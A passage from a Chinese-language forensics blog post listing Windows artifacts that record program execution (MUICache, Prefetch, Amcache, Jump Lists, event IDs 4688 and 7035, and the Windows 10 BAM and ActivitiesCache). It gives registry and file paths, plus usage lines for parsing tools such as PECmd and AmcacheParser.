-<h5 id="辅助工具UserAssist-V2-6-0"><a href="#辅助工具UserAssist-V2-6-0" class="headerlink" title="辅助工具UserAssist_V2_6_0"></a>辅助工具UserAssist_V2_6_0</h5><p><a href="https://blog.didierstevens.com/programs/userassist/" target="_blank" rel="noopener">https://blog.didierstevens.com/programs/userassist/</a><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181027182827-0aeb287c-d9d3-1.png" alt="image.png"></p>
-<h4 id="3-MUICache"><a href="#3-MUICache" class="headerlink" title="3)MUICache"></a>3)MUICache</h4><p>MUICache记录执行程序的名称和路径，但是没有记录相关执行时间。<br>注册表中位置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HKCU/Software/Microsoft/Windows/ShellNoRoam/MUICache (XP, 2000, 2003) </span><br><span class="line">HKCU/Software/Classes/Local Settings/Software/Microsoft/Windows/Shell/MuiCache  (Vista, 7, 2008)</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181027183121-721a720a-d9d3-1.png" alt="image.png"></p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181027183131-786d3822-d9d3-1.png" alt="image.png"></p>
-<h5 id="辅助工具muicache-view"><a href="#辅助工具muicache-view" class="headerlink" title="辅助工具muicache_view"></a>辅助工具muicache_view</h5><p><a href="http://www.nirsoft.net/utils/muicache_view.html" target="_blank" rel="noopener">http://www.nirsoft.net/utils/muicache_view.html</a></p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181027183158-8882060c-d9d3-1.png" alt="image.png"></p>
-<h3 id="二、文件"><a href="#二、文件" class="headerlink" title="二、文件"></a>二、文件</h3><h4 id="1-Prefetch"><a href="#1-Prefetch" class="headerlink" title="1)Prefetch"></a>1)Prefetch</h4><p>Prefetch（预读取），从Windows XP开始引入，用来加速应用程序启动过程。Prefetch包含可执行文件的名称、文件时间戳、运行次数、上次执行时间、Hash等。<br>Win7上记录最近128个可执行文件的信息，Win8-10上的最近1024个可执行文件。</p>
-<p>文件路径:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Prefetch</span><br></pre></td></tr></table></figure></p>
-<p>注册表HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters  中EnablePrefetcher的键值控制是否开启Prefetch。<br>EnablePrefetcher的数值设置：<br>0 =已禁用<br>1 =启用应用程序预读取<br>2 =启用引导预读取<br>3 =启用应用程序和引导预读取（最佳和默认）<br>虽然Windows 2003中也存在Prefetch，但默认为2,仅用于引导预读取。</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181027183526-044c3d66-d9d4-1.png" alt="image.png"></p>
-<h5 id="辅助工具PECmd"><a href="#辅助工具PECmd" class="headerlink" title="辅助工具PECmd"></a>辅助工具PECmd</h5><p><a href="https://github.com/EricZimmerman/PECmd" target="_blank" rel="noopener">https://github.com/EricZimmerman/PECmd</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">usage：</span><br><span class="line">PECmd.exe -d &quot;C:\Windows\Prefetch&quot; --csv &quot;d:\temp&quot; --json d:\temp\json</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181027183717-46713b10-d9d4-1.png" alt="image.png"></p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181027183726-4becd87e-d9d4-1.png" alt="image.png"></p>
-<h4 id="2-Amcache"><a href="#2-Amcache" class="headerlink" title="2)Amcache"></a>2)Amcache</h4><p>Amcache.hve记录执应用程序的执行路径、上次执行时间、以及SHA1值。<br>文件路径:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\AppCompat\Programs\Amcache.hve</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181027183739-537a5f6c-d9d4-1.png" alt="image.png"></p>
-<h4 id="辅助工具AmcacheParse"><a href="#辅助工具AmcacheParse" class="headerlink" title="辅助工具AmcacheParse"></a>辅助工具AmcacheParse</h4><p><a href="https://github.com/EricZimmerman/AmcacheParser" target="_blank" rel="noopener">https://github.com/EricZimmerman/AmcacheParser</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">usage：</span><br><span class="line">AmcacheParser.exe -f C:\Windows\AppCompat\Programs\Amcache.hve --csv d:\temp</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181027183822-6d073a72-d9d4-1.png" alt="image.png"></p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181027183830-724ff78a-d9d4-1.png" alt="image.png"></p>
-<h4 id="3-Jump-Lists"><a href="#3-Jump-Lists" class="headerlink" title="3)Jump Lists"></a>3)Jump Lists</h4><p>Windows 7-10用来任务栏显示经常使用或最近使用的项目。<br>文件路径：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\&lt;username&gt;\AppData\Roaming\Microsoft\Windows\Recent\AutomaticDestinations</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181027183913-8bfec36e-d9d4-1.png" alt="image.png"></p>
-<h4 id="辅助工具JumpListExplorer"><a href="#辅助工具JumpListExplorer" class="headerlink" title="辅助工具JumpListExplorer"></a>辅助工具JumpListExplorer</h4><p><a href="https://ericzimmerman.github.io/Software/JumpListExplorer.zip" target="_blank" rel="noopener">https://ericzimmerman.github.io/Software/JumpListExplorer.zip</a></p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181027183942-9d0f0a88-d9d4-1.png" alt="image.png"></p>
-<h3 id="三、日志"><a href="#三、日志" class="headerlink" title="三、日志"></a>三、日志</h3><h4 id="1-安全事件日志Security-Log-592-4688"><a href="#1-安全事件日志Security-Log-592-4688" class="headerlink" title="1) 安全事件日志Security Log (592/4688)"></a>1) 安全事件日志Security Log (592/4688)</h4><p>Windows 7、Windows Server 2008 R2 /2012 及之后，会在每次创建一个进程时创建一个事件日志，并传递到该进程的命令行信息。事件将记录到现有事件 ID 4688 并保存到 Windows 安全日志。但仅在启用了“审核进程创建”时记录4688。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">592   创建一个新进程（Windows Server 2003）</span><br><span class="line">4688  创建一个新进程（Windows 7、Windows Server 2008 R2/ 2012及之后）</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181027184400-36f3f80c-d9d5-1.png" alt="image.png"></p>
-<h4 id="2-系统事件日志System-Log-7035-7036"><a href="#2-系统事件日志System-Log-7035-7036" class="headerlink" title="2) 系统事件日志System Log (7035/7036)"></a>2) 系统事件日志System Log (7035/7036)</h4><p>Windows XP/7/ Windows Server 2003,当服务启动或停止时，服务控制管理器会记录到系统事件日志中的ID 7035。因此，如果关联的进程被注册为服务，则可发现执行痕迹。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">7035   Service Control Manager    xxx服务成功发送一个开始控件。</span><br><span class="line">7036   Service Control Manager    xxx服务处于 正在运行/停止 状态</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181027184413-3e5efc9a-d9d5-1.png" alt="image.png"></p>
-<h4 id="3-计划任务日志TaskScheduler"><a href="#3-计划任务日志TaskScheduler" class="headerlink" title="3) 计划任务日志TaskScheduler"></a>3) 计划任务日志TaskScheduler</h4><p>计划任务日志中也可能发现可执行文件执行的痕迹。</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181027184424-452b0906-d9d5-1.png" alt="image.png"></p>
-<h3 id="四、Win10特有功能"><a href="#四、Win10特有功能" class="headerlink" title="四、Win10特有功能"></a>四、Win10特有功能</h3><h4 id="1-RecentApps（win10）"><a href="#1-RecentApps（win10）" class="headerlink" title="1) RecentApps（win10）"></a>1) RecentApps（win10）</h4><p>Windows 10<br>注册表中位置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKCU\Software\Microsoft\Windows\Current Version\Search\RecentApps</span><br></pre></td></tr></table></figure></p>
-<h4 id="2-BAM-Background-Activity-Monitor-win10"><a href="#2-BAM-Background-Activity-Monitor-win10" class="headerlink" title="2) BAM/Background Activity Monitor (win10)"></a>2) BAM/Background Activity Monitor (win10)</h4><p>从Windows 10 1709 (Fall Creators update)版本开始引用。<br>注册表中位置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKLM\SYSTEM\CurrentControlSet\Services\bam\UserSettings\&#123;SID&#125;</span><br></pre></td></tr></table></figure></p>
-<h4 id="3-ActivitiesCache-db（win10）"><a href="#3-ActivitiesCache-db（win10）" class="headerlink" title="3) ActivitiesCache.db（win10）"></a>3) ActivitiesCache.db（win10）</h4><p>从Windows 10 1803 (April 2018)版本开始引用。<br>文件路径：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\&lt;profile&gt;\AppData\Local\ConnectedDevicesPlatform\L.&lt;profile&gt;\ActivitiesCache.db</span><br></pre></td></tr></table></figure></p>
-<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.1234n6.com/2018/10/available-artifacts-evidence-of.html?m=1" target="_blank" rel="noopener">https://blog.1234n6.com/2018/10/available-artifacts-evidence-of.html?m=1</a><br><a href="https://www.andreafortuna.org/dfir/forensic-artifacts-evidences-of-program-execution-on-windows-systems/" target="_blank" rel="noopener">https://www.andreafortuna.org/dfir/forensic-artifacts-evidences-of-program-execution-on-windows-systems/</a><br><a href="https://www.fireeye.com/blog/threat-research/2013/08/execute.html" target="_blank" rel="noopener">https://www.fireeye.com/blog/threat-research/2013/08/execute.html</a><br><a href="https://www.andreafortuna.org/cybersecurity/amcache-and-shimcache-in-forensic-analysis/" target="_blank" rel="noopener">https://www.andreafortuna.org/cybersecurity/amcache-and-shimcache-in-forensic-analysis/</a></p>
 
           
         
